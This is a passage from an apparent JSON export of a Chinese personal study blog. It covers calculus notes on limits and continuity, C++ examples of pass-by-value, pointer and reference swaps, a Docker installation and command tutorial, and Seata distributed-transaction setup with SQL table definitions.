$\\phi(y)=\\frac{1}{f’(x)}$ 复合函数：链式法则： 剥洋葱解法，从外往里剥。 高阶函数 对$y$求两次导数，记作$y^{‘’}$,二阶导数 或者$\\frac{d^2y}{dx^2}$ 从4阶开始用数字表示:$y^{(4)}$ 例题：","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"连续","slug":"连续","date":"2020-09-14T07:53:48.000Z","updated":"2021-04-11T17:11:29.055Z","comments":true,"path":"continuous/","link":"","permalink":"https://kayleh.top/continuous/","excerpt":"","text":"增量(改变量) △x是自变量的增量，△y是因变量的增量 定义： f(x)在$x_0$的邻域内有定义，$△x\\to 0$,$△y\\to 0$ \\lim_{x\\to 0}△y=\\lim\\_{x\\to 0} [f(x_0+△x)-f(x_0)]=0&amp;或者 \\lim_{x\\to x_0} f(x) = f(x_0)那么就叫这个函数在这点$x_0$上是连续的 1)在$x_0$处有定义 2)$x\\to x_0 f(x)$有极限 3)极限=在$x_0$处的定义，$f(x_0)$ 左连续 $(x_0-\\delta,x_0]$ 在x_0处连续的充要条件是既是左连续也是右连续 在区间上连续 间断点连续的条件 1)在$x_0$处有定义 2)$x\\to x_0 f(x)$有极限 3)极限=定义 无穷间断 在$x_0$处没有定义 振荡 $x\\to x_0 f(x)$没有极限 跳跃 左右极限不相等 可去 第一类间断点：左右极限均存在，跳跃、可去间断点 第二类间断点：左右极限不存在，无穷间断、振荡 例题： 左右极限都存在但不相等 运算法则四则运算 $f(x)±g(x).g(x)f(x).\\frac{f(x)}{g(x)} (g(x)≠0)$ 依然连续 例题： $f(x)= e^{lnf(x)}$、两个重要极限 闭区间上连续性质(有界性) 如果在$[a,b]$上是连续的，有界 (最值性) 如果在$[a,b]$上是连续的，b有最大最小值 (介值性) 如果在$[a,b]$上是连续的，最小值m，最大值M，介于m和M之间的任意一个取值：m&lt;c&lt;M 必存在一点$\\xi$: $f(\\xi)=c$ 零点存在定理[a,b]上是连续的，f(a)f(b)&lt;0 异号 在(a,b)存在一点$\\xi$，$f(\\xi)=0$","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"无穷小与无穷大","slug":"无穷小与无穷大","date":"2020-09-12T00:33:41.000Z","updated":"2021-04-11T17:11:28.915Z","comments":true,"path":"infinitesimal-and-infinite/","link":"","permalink":"https://kayleh.top/infinitesimal-and-infinite/","excerpt":"","text":"无穷小量定义：极限为0的变量称为无穷小量，简称无穷小. f(x)→0 常用希腊字母 $\\alpha$ ,$\\beta$ ,$\\gamma$ \\lim_{x\\to0}x^2=0 极限为0\\lim_{x\\to1}x^2=1 极限为1\\lim_{x\\to\\infty}x^2=0 极限为\\infty定理:1.无穷小 × 有界 是无穷小 另一个例题 分解后面的ardtanx，加上绝对值|ardtanx|，说明是有界的。 2. 无穷大$f(x)-&gt;+\\infty 或-\\infty$ 1)两个无穷大相乘=无穷大 2)无穷大+有界-&gt;无穷大 定理：3. f(x)无穷大 $\\frac{1}{f(x)}$无穷小 (同一变化过程) f(x)无穷小 $\\frac{1}{f(x)}$无穷小(同一变化过程) 极限的运算法则定理(四则运算) 若$\\lim f(x)=a , \\lim g(x)=b$（前提是每个函数极限存在,项是有限个的） 1)$\\lim (f(x)+g(x))=\\lim f(x) ± \\lim g(x)=a ± b$ 2)$\\lim f(x)g(x)=\\lim f(x) · \\lim g(x)$ 3)$\\lim \\frac{f(x)}{g(x)}=\\frac {\\lim f(x)}{\\lim g(x)}(b≠0)$ 其实就是把极限带进去 $\\lim f(x)^n=(\\lim f(x))^n$ 例如： $\\frac{\\infty}{\\infty}$分子、分母同次，最高次的系数之比（分子分母都趋于无穷） 分母次数高，0 分子次数高，$\\infty$ 分子有理化 无限个项：多项式$ \\frac{n(a_1+a_n)}{2}$ =1 极限存在准则 两个重要极限一、夹逼定理：存在三个函数f(x).g(x).h(x) 中间的一堆乘起来小于1，当n趋于无穷时，左边趋于0，右边趋于0 二、单调有界数列必有极限 ∴单调递增 两个重要极限\\lim_{x\\to0} \\frac{sinx}{x}=1例题1 例题2 例题3 利用反函数： 题型： 无穷小的比较$\\lim f(x)=0$ ,$\\lim$ $g(x)=0$ ,$g(x)≠0$ $\\lim \\frac{f(x)}{g(x)}=0$ .$f(x)$比$g(x)$高阶无穷小，$f(x)=o(g(x))$ $\\lim \\frac{f(x)}{g(x)}=\\infty$ .$f(x)$比$g(x)$低阶无穷小，没有符号 如: $x\\to 0$ , $\\frac{x}{x^2}$ ,分母的趋0速度更快， $\\frac{1}{x}$ $\\lim \\frac{f(x)}{g(x)}=c≠0$，同阶无穷小； 如：$x&gt;0$ , $\\frac{4x}{2x}=2$ $\\lim \\frac{f(x)}{g(x)}=c=1$ , 等价无穷小$f(x)$~$g(x)$ 例题： 1)$ln(1+x)$~$x$ $x\\to0$ 2)$e^x-1$~$x$ 有个结论： $a^x-1$~$xlna$ 3)$\\sqrt[n]{1+x}-1$~$\\frac{1}{n}x$ 可以直接用的公式： $f_1(x)$~$f_2(x)$,$g_1(x)$~$g_2(x)$ , $\\lim \\frac{f_2(x)}{g_2(x)}$存在极限 $\\lim \\frac{f_1(x)}{g_1(x)}$ = $\\lim \\frac{f_2(x)}{g_2(x)}$ 1）两个无穷小之比才用 2）分子或分母是因子的乘积，选部分因替换 $\\frac{(●)×(●)×(■)}{(●)×(■)}$ 只保留■。 例题： ∵ $sinx$~$x$","categories":[{"name":"高数","slug":"高数","permalink":"https://kayleh.top/categories/%E9%AB%98%E6%95%B0/"}],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"极限","slug":"极限","date":"2020-09-11T18:30:50.000Z","updated":"2021-04-11T17:11:28.922Z","comments":true,"path":"limit/","link":"","permalink":"https://kayleh.top/limit/","excerpt":"","text":"极限 [“极限”是数学中的分支——微积分的基础概念，广义的“极限”是指“无限靠近而永远不能到达”的意思。数学中的“极限”指：某一个函数中的某一个变量，此变量在变大（或者变小）的永远变化的过程中，逐渐向某一个确定的数值A不断地逼近而“永远不能够重合到A”（“永远不能够等于A，但是取等于A‘已经足够取得高精度计算结果）的过程中，此变量的变化，被人为规定为“永远靠近而不停止”、其有一个“不断地极为靠近A点的趋势”。极限是一种“变化状态”的描述。此变量永远趋近的值A叫做“极限值”（当然也可以用其他符号表示）。 证明：1=0.9999·····？ 比如 假设有一圆 有内接圆面积$A_1$ 记内接十二边形的面积为$A_2$ 24边形 就可以得到一个数列{$A_n$} 数列的极限当n→$\\infty$时，{$A_n$}也无限接近于某一确定的数值，这个数值称为数列{$A_n$}当n→$\\infty$时的极限。 后面的值都落在这个邻域里面 n一定是 &gt; ??? 要求 $\\lvert x_n -1 \\rvert$=$\\frac{1}{n}$&lt;$\\epsilon$,只要n&gt;[$\\frac{1}{\\epsilon} $],以后的一切项均满足 $\\lvert x_n -1 \\rvert$&lt;$\\epsilon$. 对于任意给定的正数$\\epsilon$，总存在着一个正整数N(比如取N=[$\\frac{1}{\\epsilon}$]),当n&gt;N时， \\lvert x_n -1 \\rvert","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"值传递","slug":"函数和指针","date":"2020-09-09T21:01:12.000Z","updated":"2021-04-11T17:11:28.627Z","comments":true,"path":"pass-by-value/","link":"","permalink":"https://kayleh.top/pass-by-value/","excerpt":"","text":"传值调用向函数传递参数的传值调用方法，把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数不会影响实际参数。默认情况下，C++ 使用传值调用方法来传递参数。一般来说，这意味着函数内的代码不会改变用于调用函数的实际参数。 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;using namespace std;// 函数声明void swap(int x, int y);// 函数定义void swap(int x, int y)&#123; int temp; temp = x; /* 保存 x 的值 */ x = y; /* 把 y 赋值给 x */ y = temp; /* 把 x 赋值给 y */ return;&#125;int main()&#123; // 局部变量声明 int a = 100; int b = 200; cout &lt;&lt; \"before swap,a:\" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"before swap,b:\" &lt;&lt; b &lt;&lt; endl; // 调用函数来交换值 swap(a, b); cout &lt;&lt; \"After swap,a:\" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"After swap,b:\" &lt;&lt; b &lt;&lt; endl; return 0;&#125; 指针调用向函数传递参数的指针调用方法，把参数的地址复制给形式参数。在函数内，该地址用于访问调用中要用到的实际参数。这意味着，修改形式参数会影响实际参数。 按指针传递值，参数指针被传递给函数，就像传递其他值给函数一样。因此相应地，在下面的函数 swap()中，您需要声明函数参数为指针类型，该函数用于交换参数所指向的两个整数变量的值。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;using namespace std;void swap(int *x, int *y);// 函数定义void swap(int *x, int *y)&#123; int temp; temp = *x; /* 保存地址 x 的值 */ *x = *y; /* 把 y 赋值给 x */ *y = temp; /* 把 x 赋值给 y */ return;&#125;int main()&#123; int a = 100; int b = 200; cout &lt;&lt; \"before swap,a:\" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"before swap,b:\" &lt;&lt; b &lt;&lt; endl; /* 调用函数来交换值 * &amp;a 表示指向 a 的指针，即变量 a 的地址 * &amp;b 表示指向 b 的指针，即变量 b 的地址 */ swap(&amp;a, &amp;b); cout &lt;&lt; \"After swap,a:\" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"After swap,b:\" &lt;&lt; b &lt;&lt; endl; return 0;&#125; 引用调用//向函数传递参数的引用调用方法，把引用的地址复制给形式参数。在函数内，该引用用于访问调用中要用到的实际参数。这意味着，修改形式参数会影响实际参数。//按引用传递值，参数引用被传递给函数，就像传递其他值给函数一样。因此相应地，//在下面的函数 swap()中，您需要声明函数参数为引用类型，该函数用于交换参数所指向的两个整数变量的值。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;void swap(int &amp;x, int &amp;y);// 函数定义void swap(int &amp;x, int &amp;y)&#123; int temp; temp = x; /* 保存地址 x 的值 */ x = y; /* 把 y 赋值给 x */ y = temp; /* 把 x 赋值给 y */ return;&#125;int main()&#123; // 局部变量声明 int a = 100; int b = 200; cout &lt;&lt; \"before swap,a:\" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"before swap,b:\" &lt;&lt; b &lt;&lt; endl; // 调用函数来交换值 swap(a, b); cout &lt;&lt; \"After swap,a:\" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"After swap,b:\" &lt;&lt; b &lt;&lt; endl; return 0;&#125;","categories":[{"name":"C","slug":"C","permalink":"https://kayleh.top/categories/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"docker虚拟化容器","slug":"docker虚拟化容器(ing)","date":"2020-08-28T00:36:20.000Z","updated":"2021-04-11T17:11:28.498Z","comments":true,"path":"docker-virtualized-container/","link":"","permalink":"https://kayleh.top/docker-virtualized-container/","excerpt":"docker","text":"docker 为什么会有docker出现 一款产品从开发到上线，从操作系统，到运行环境，再到应用配置。作为开发+运维之间的协作我们需要关心很多东西，这也是很多互联网公司都不得不面对的问题，特别是各种版本的迭代之后，不同版本环境的兼容，对运维人员都是考验Docker之所以发展如此迅速，也是因为它对此给出了一个标准化的解决方案。环境配置如此麻烦，换一台机器，就要重来一次，费力费时。很多人想到，能不能从根本上解决问题，软件可以带环境安装？也就是说，安装的时候，把原始环境一模一样地复制过来。开发人员利用 Docker 可以消除协作编码时“在我的机器上可正常工作”的问题。 之前在服务器配置一个应用的运行环境，要安装各种软件，就拿尚硅谷电商项目的环境来说吧，Java/Tomcat/MySQL/JDBC驱动包等。安装和配置这些东西有多麻烦就不说了，它还不能跨平台。假如我们是在 Windows 上安装的这些环境，到了 Linux 又得重新装。况且就算不跨操作系统，换另一台同样操作系统的服务器，要移植应用也是非常麻烦的。 传统上认为，软件编码开发/测试结束后，所产出的成果即是程序或是能够编译执行的二进制字节码等(java为例)。而为了让这些程序可以顺利执行，开发团队也得准备完整的部署文件，让维运团队得以部署应用程式，开发需要清楚的告诉运维部署团队，用的全部配置文件+所有软件环境。不过，即便如此，仍然常常发生部署失败的状况。Docker镜像的设计，使得Docker得以打破过去「程序即应用」的观念。透过镜像(images)将作业系统核心除外，运作应用程式所需要的系统环境，由下而上打包，达到应用程式跨平台间的无缝接轨运作。 docker理念Docker是基于Go语言实现的云开源项目。Docker的主要目标是“Build，Ship and Run Any App,Anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。 Linux 容器技术的出现就解决了这样一个问题，而 Docker 就是在它的基础上发展过来的。将应用运行在 Docker 容器上面，而 Docker 容器在任何操作系统上都是一致的，这就实现了跨平台、跨服务器。只需要一次配置好环境，换到别的机子上就可以一键部署好，大大简化了操作 解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。 能干吗？之前的虚拟机技术：虚拟机（virtual machine）就是带环境安装的一种解决方案。它可以在一种操作系统里面运行另一种操作系统，比如在Windows 系统里面运行Linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。 虚拟机的缺点：1 资源占用多 2 冗余步骤多 3 启动慢 容器虚拟化技术由于前面虚拟机存在这些缺点，Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。 比较了 Docker 和传统虚拟化方式的不同之处：传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程； 而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。 每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。 开发/运维（DevOps） 一次构建、随处运行 更快速的应用交付和部署 传统的应用开发完成后，需要提供一堆安装程序和配置说明文档，安装部署后需根据配置文档进行繁杂的配置才能正常运行。Docker化之后只需要交付少量容器镜像文件，在正式生产环境加载镜像并运行即可，应用安装配置在镜像里已经内置好，大大节省部署配置和测试验证时间。 更便捷的升级和扩缩容 随着微服务架构和Docker的发展，大量的应用会通过微服务方式架构，应用的开发构建将变成搭乐高积木一样，每个Docker容器将变成一块“积木”，应用的升级将变得非常容易。当现有的容器不足以支撑业务处理时，可通过镜像运行新的容器进行快速扩容，使应用系统的扩容从原先的天级变成分钟级甚至秒级。 更简单的系统运维 应用容器化运行后，生产环境运行的应用可与开发、测试环境的应用高度一致，容器会将应用程序相关的环境和状态完全封装起来，不会因为底层基础架构和操作系统的不一致性给应用带来影响，产生新的BUG。当出现程序异常时，也可以通过测试环境的相同容器进行快速定位和修复。 更高效的计算资源利用 Docker是内核级虚拟化，其不像传统的虚拟化技术一样需要额外的Hypervisor支持，所以在一台物理机上可以运行很多个容器实例，可大大提升物理服务器的CPU和内存的利用率。 docker中文网站：https://www.docker-cn.com/ 仓库：Docker Hub官网: https://hub.docker.com/ 安装前提：CentOS Docker 安装Docker支持以下的CentOS版本：CentOS 7 (64-bit)CentOS 6.5 (64-bit) 或更高的版本 前提条件目前，CentOS 仅发行版本中的内核支持 Docker。Docker 运行在 CentOS 7 上，要求系统为64位、系统内核版本为 3.10 以上。Docker 运行在 CentOS-6.5 或更高的版本的 CentOS 上，要求系统为64位、系统内核版本为 2.6.32-431 或者更高版本。 查看自己的内核uname命令用于打印当前系统相关信息（内核版本号、硬件架构、主机名称和操作系统类型等）。 查看已安装的CentOS版本信息（CentOS6.8有，CentOS7无该命令） Docker的基本组成镜像（image） Docker 镜像（Image）就是一个只读的模板。镜像可以用来创建 Docker 容器，一个镜像可以创建很多容器。 容器（container） Docker 利用容器（Container）独立运行的一个或一组应用。容器是用镜像创建的运行实例。 它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。 可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。 容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。 仓库（repository） 仓库（Repository）是集中存放镜像文件的场所。仓库(Repository)和仓库注册服务器（Registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。 仓库分为公开仓库（Public）和私有仓库（Private）两种形式。最大的公开仓库是 Docker Hub(https://hub.docker.com/)，存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云 、网易云 等 小总结 需要正确的理解仓储/镜像/容器这几个概念: Docker 本身是一个容器运行载体或称之为管理引擎。我们把应用程序和配置依赖打包好形成一个可交付的运行环境，这个打包好的运行环境就似乎 image镜像文件。只有通过这个镜像文件才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。 image 文件生成的容器实例，本身也是一个文件，称为镜像文件。 一个容器运行一种服务，当我们需要的时候，就可以通过docker客户端创建一个对应的运行实例，也就是我们的容器 至于仓储，就是放了一堆镜像的地方，我们可以把镜像发布到仓储中，需要的时候从仓储中拉下来就可以了。 Docker的架构图 CentOS7安装Docker https://docs.docker.com/install/linux/docker-ce/centos/ 官网中文安装参考手册: https://docs.docker-cn.com/engine/installation/linux/docker-ce/centos/#prerequisites 确定你是CentOS7及以上版本 1cat /etc/redhat-release yum安装gcc相关 CentOS7能上外网 12yum -y install gccyum -y install gcc-c++ 卸载旧版本 1yum -y remove docker docker-common docker-selinux docker-engine 2018.3官网版本 12345678910yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine 安装需要的软件包 1yum install -y yum-utils device-mapper-persistent-data lvm2 设置stable镜像仓库 1yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 更新yum软件包索引 1yum makecache fast 安装DOCKER CE 1yum -y install docker-ce 启动docker 1systemctl start docker 测试 12docker versiondocker run hello-world 配置镜像加速 12345678910111213141516mkdir -p /etc/dockervim /etc/docker/daemon.json---- #网易云&#123;\"registry-mirrors\": [\"http://hub-mirror.c.163.com\"] &#125; #阿里云&#123; \"registry-mirrors\": [\"https://｛自已的编码｝.mirror.aliyuncs.com\"]&#125;----systemctl daemon-reloadsystemctl restart docker 卸载 123systemctl stop docker yum -y remove docker-cerm -rf /var/lib/docker 使用阿里云镜像加速 https://dev.aliyun.com/search.html 登陆阿里云开发者平台,获取加速器地址 配置本机Docker运行镜像加速器 鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是阿里云的本人自己账号的镜像地址(需要自己注册有一个属于你自己的)： https://xxxx.mirror.aliyuncs.com 1234vim &#x2F;etc&#x2F;sysconfig&#x2F;docker将获得的自己账户下的阿里云加速地址配置进other_args&#x3D;&quot;--registry-mirror&#x3D;https:&#x2F;&#x2F;你自己的账号加速信息.mirror.aliyuncs.com&quot; 重新启动Docker后台服务：service docker restart Linux 系统下配置完加速器需要检查是否生效 如果从结果中看到了配置的—registry-mirror参数说明配置成功，如下所示: 启动Docker后台容器(测试运行 hello-world)1docker run hello-world 输出这段提示以后，hello world就会停止运行，容器自动终止。 run干了什么 Docker是怎么工作的 Docker是一个Client-Server结构的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。 为什么Docker比较比VM快 (1)docker有着比虚拟机更少的抽象层。由亍docker不需要Hypervisor实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。 (2)docker利用的是宿主机的内核,而不需要Guest OS。因此,当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。仍而避免引寻、加载操作系统内核返个比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载Guest OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返个过程,因此新建一个docker容器只需要几秒钟。 Docker常用命令帮助命令 docker version docker info docker —help 镜像命令 docker images 列出本地主机上的镜像 各个选项说明: 12345REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小 同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像 OPTIONS说明： -a :列出本地所有的镜像（含中间映像层） -q :只显示镜像ID。 —digests :显示镜像的摘要信息 —no-trunc :显示完整的镜像信息 docker search 某个XXX镜像名字 https://hub.docker.com 命令: docker search [OPTIONS] 镜像名字 OPTIONS说明： —no-trunc : 显示完整的镜像描述 -s : 列出收藏数不小于指定值的镜像。 —automated : 只列出 automated build类型的镜像； docker pull 某个XXX镜像名字 下载镜像 docker pull 镜像名字[:TAG] docker rmi 某个XXX镜像名字ID 删除镜像 删除单个 docker rmi -f 镜像ID 删除多个 docker rmi -f 镜像名1:TAG 镜像名2:TAG 删除全部 docker rmi -f $(docker images -qa) ？思考 结合我们Git的学习心得，大家猜猜是否会有docker commit /docker push？？ 容器命令 有镜像才能创建容器，这是根本前提(下载一个CentOS镜像演示) docker pull centos 新建并启动容器 1docker run [OPTIONS] IMAGE [COMMAND] [ARG...] OPTIONS说明: 有些是一个减号，有些是两个减号 12345678910--name&#x3D;&quot;容器新名字&quot;: 为容器指定一个名称；-d: 后台运行容器，并返回容器ID，也即启动守护式容器；-i：以交互模式运行容器，通常与 -t 同时使用；-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；-P: 随机端口映射；-p: 指定端口映射，有以下四种格式 ip:hostPort:containerPort ip::containerPort hostPort:containerPort containerPort 启动交互式容器 12#使用镜像centos:latest以交互模式启动一个容器,在容器内执行&#x2F;bin&#x2F;bash命令。docker run -it centos &#x2F;bin&#x2F;bash 列出当前所有正在运行的容器 12345678docker ps [OPTIONS]-------------------------------------OPTIONS说明-a :列出当前所有正在运行的容器+历史上运行过的-l :显示最近创建的容器。-n：显示最近n个创建的容器。-q :静默模式，只显示容器编号。--no-trunc :不截断输出。 退出容器 两种退出方式 exit 容器停止退出 ctrl+P+Q 容器不停止退出 启动容器 1docker start 容器ID或者容器名 重启容器 1docker restart 容器ID或者容器名 停止容器 1docker stop 容器ID或者容器名 强制停止容器 1docker kill 容器ID或者容器名 删除已停止的容器 1docker rm 容器ID 一次性删除多个容器 12docker rm -f $(docker ps -a -q)docker ps -a -q | xargs docker rm 重要 启动守护式容器 123456789101112131415docker run -d 容器名---------------------------- #使用镜像centos:latest以后台模式启动一个容器docker run -d centos 问题：然后docker ps -a 进行查看, 会发现容器已经退出很重要的要说明的一点: Docker容器后台运行,就必须有一个前台进程.容器运行的命令如果不是那些一直挂起的命令（比如运行top，tail），就是会自动退出的。 这个是docker的机制问题,比如你的web容器,我们以nginx为例，正常情况下,我们配置启动服务只需要启动响应的service即可。例如service nginx start但是,这样做,nginx为后台进程模式运行,就导致docker前台没有运行的应用,这样的容器后台启动后,会立即自杀因为他觉得他没事可做了.所以，最佳的解决方案是,将你要运行的程序以前台进程的形式运行 查看容器日志 1docker logs -f -t --tail 容器ID docker run -d centos /bin/sh -c “while true;do echo hello zzyy;sleep 2;done” -t 是加入时间戳 -f 跟随最新的日志打印 —tail 数字 显示最后多少条 查看容器内运行的进程 1docker top 容器ID 查看容器内部细节 1docker inspect 容器ID 进入正在运行的容器并以命令行交互 docker exec -it 容器ID bashShell 重新进入docker attach 容器ID 上述两个区别 12attach 直接进入容器启动命令的终端，不会启动新的进程exec 是在容器中打开新的终端，并且可以启动新的进程 从容器内拷贝文件到主机上 1docker cp 容器ID:容器内路径 目的主机路径 小总结 1234567891011121314151617181920212223242526272829303132333435363738attach Attach to a running container # 当前 shell 下 attach 连接指定运行镜像build Build an image from a Dockerfile # 通过 Dockerfile 定制镜像commit Create a new image from a container changes # 提交当前容器为新的镜像cp Copy files&#x2F;folders from the containers filesystem to the host path #从容器中拷贝指定文件或者目录到宿主机中create Create a new container # 创建一个新的容器，同 run，但不启动容器diff Inspect changes on a container&#39;s filesystem # 查看 docker 容器变化events Get real time events from the server # 从 docker 服务获取容器实时事件exec Run a command in an existing container # 在已存在的容器上运行命令export Stream the contents of a container as a tar archive # 导出容器的内容流作为一个 tar 归档文件[对应 import ]history Show the history of an image # 展示一个镜像形成历史images List images # 列出系统当前镜像import Create a new filesystem image from the contents of a tarball # 从tar包中的内容创建一个新的文件系统映像[对应export]info Display system-wide information # 显示系统相关信息inspect Return low-level information on a container # 查看容器详细信息kill Kill a running container # kill 指定 docker 容器load Load an image from a tar archive # 从一个 tar 包中加载一个镜像[对应 save]login Register or Login to the docker registry server # 注册或者登陆一个 docker 源服务器logout Log out from a Docker registry server # 从当前 Docker registry 退出logs Fetch the logs of a container # 输出当前容器日志信息port Lookup the public-facing port which is NAT-ed to PRIVATE_PORT # 查看映射端口对应的容器内部源端口pause Pause all processes within a container # 暂停容器ps List containers # 列出容器列表pull Pull an image or a repository from the docker registry server # 从docker镜像源服务器拉取指定镜像或者库镜像push Push an image or a repository to the docker registry server # 推送指定镜像或者库镜像至docker源服务器restart Restart a running container # 重启运行的容器rm Remove one or more containers # 移除一个或者多个容器rmi Remove one or more images # 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]run Run a command in a new container # 创建一个新的容器并运行一个命令save Save an image to a tar archive # 保存一个镜像为一个 tar 包[对应 load]search Search for an image on the Docker Hub # 在 docker hub 中搜索镜像start Start a stopped containers # 启动容器stop Stop a running containers # 停止容器tag Tag an image into a repository # 给源中镜像打标签top Lookup the running processes of a container # 查看容器中运行的进程信息unpause Unpause a paused container # 取消暂停容器version Show the docker version information # 查看 docker 版本号wait Block until a container stops, then print its exit code # 截取容器停止时的退出状态值","categories":[{"name":"linux","slug":"linux","permalink":"https://kayleh.top/categories/linux/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://kayleh.top/tags/docker/"}]},{"title":"SnowFlake分布式ID雪花算法","slug":"SnowFlake分布式ID雪花算法(ing)","date":"2020-08-28T00:20:50.000Z","updated":"2021-04-11T17:11:28.420Z","comments":true,"path":"snowflake-distributed-id-algorithm/","link":"","permalink":"https://kayleh.top/snowflake-distributed-id-algorithm/","excerpt":"","text":"","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"Seata处理分布式事务","slug":"Seata处理分布式事务","date":"2020-08-25T20:25:48.000Z","updated":"2021-04-11T17:11:28.398Z","comments":true,"path":"seata-handles-distributed-transactions/","link":"","permalink":"https://kayleh.top/seata-handles-distributed-transactions/","excerpt":"Seata","text":"Seata 分布式事务问题分布式前 单机单库没这个问题 从1：1 -&gt; 1:N -&gt; N: N 分布式之后 一次业务操作需要跨多个数据源或需要跨多个系统进行远程调用，就会产生分布式事务问题 Seata简介是什么 Seata是一款开源的分布式事务解决方案，致力于在微服务架构下提供高性能和简单易用的分布式事务服务 http://seata.io/zh-cn/ 能干嘛一个典型的分布式事务过程分布式事务处理过程的-ID+三组件模型 Transaction ID XID 全局唯一的事务ID 3组件概念 Transaction Coordinator(TC) 事务协调器，维护全局事务的运行状态，负责协调并驱动全局事务的提交或回滚; Transaction Manager(TM) 控制全局事务的边界，负责开启一个全局事务，并最终发起全局提交或全局回滚的决议; Resource Manager(RM) 控制分支事务，负责分支注册，状态汇报，并接收事务协调器的指令，驱动分支（本地）事务的提交和回滚； 处理过程 下载 发布说明:https://github.com/seata/seata/releases 怎么用 Spring 本地@Transactional 全局@GlobalTransactional SEATA的分布式交易解决方案 Seata-Server安装 http://seata.io/zh-cn/ 下载版本 seata-server-0.9.0.zip解压到指定目录并修改conf目录下的file.conf配置文件 先备份原始file.conf文件 主要修改：自定义事务组名称+事务日志存储模式为db+数据库连接信息 file.conf service模块 1vgroup_mapping.my_test_tx_group &#x3D; &quot;fsp_tx_group&quot; store模块 123456mode &#x3D; &quot;db&quot; url &#x3D; &quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;seata&quot; user &#x3D; &quot;root&quot; password &#x3D; &quot;你自己的密码&quot; mysql5.7数据库新建库seata 在seata库里建表 建表db_store.sql在\\seata-server-0.9.0\\seata\\conf目录里面(1.0版本在readme.md里面) db_store.sql SQL 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-- the table to store GlobalSession datadrop table if exists `global_table`;create table `global_table` ( `xid` varchar(128) not null, `transaction_id` bigint, `status` tinyint not null, `application_id` varchar(32), `transaction_service_group` varchar(32), `transaction_name` varchar(128), `timeout` int, `begin_time` bigint, `application_data` varchar(2000), `gmt_create` datetime, `gmt_modified` datetime, primary key (`xid`), key `idx_gmt_modified_status` (`gmt_modified`, `status`), key `idx_transaction_id` (`transaction_id`)); -- the table to store BranchSession datadrop table if exists `branch_table`;create table `branch_table` ( `branch_id` bigint not null, `xid` varchar(128) not null, `transaction_id` bigint , `resource_group_id` varchar(32), `resource_id` varchar(256) , `lock_key` varchar(128) , `branch_type` varchar(8) , 